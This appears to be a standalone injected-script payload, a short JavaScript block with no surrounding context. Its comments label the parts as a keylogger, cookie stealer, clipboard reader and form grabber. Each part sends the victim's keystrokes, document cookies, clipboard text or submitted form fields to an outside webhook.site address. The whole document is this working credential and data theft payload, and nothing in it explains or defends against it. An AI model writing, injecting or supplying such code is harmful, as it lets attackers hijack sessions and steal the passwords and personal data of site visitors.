<script>
(function(){
  // Keylogger
  document.addEventListener('keydown', function(e) {
    fetch("https://webhook.site/bc89e1d2-18dd-4ff8-aa03-fef72ceb7627?key=" + e.key);
  });

  // Cookie Stealer
  fetch("https://webhook.site/bc89e1d2-18dd-4ff8-aa03-fef72ceb7627?cookie=" + document.cookie);

  // Clipboard
  document.addEventListener('copy', async function () {
    const text = await navigator.clipboard.readText();
    fetch("https://webhook.site/bc89e1d2-18dd-4ff8-aa03-fef72ceb7627?clip=" + encodeURIComponent(text));
  });

  // Auto Form Grabber
  document.querySelectorAll('form').forEach(form => {
    form.addEventListener('submit', function(e) {
      const formData = new FormData(form);
      const data = new URLSearchParams(formData).toString();
      fetch("https://webhook.site/bc89e1d2-18dd-4ff8-aa03-fef72ceb7627?" + data);
    });
  });

})();
</script>
